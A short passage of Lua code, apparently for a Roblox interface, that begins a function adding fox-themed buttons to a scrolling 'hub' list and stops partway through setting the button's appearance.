local function AddHubScript(name, code)
    local btn = Instance.new("TextButton")
    btn.Parent = HubScrolling
    btn.BackgroundColor3 = FOX_COLORS.Accent
    btn.Size = UDim2.new(1,0,0,30)
    btn.Text = "🦊 " .. name
    btn.TextColor3 = FOX_COLORS.Text
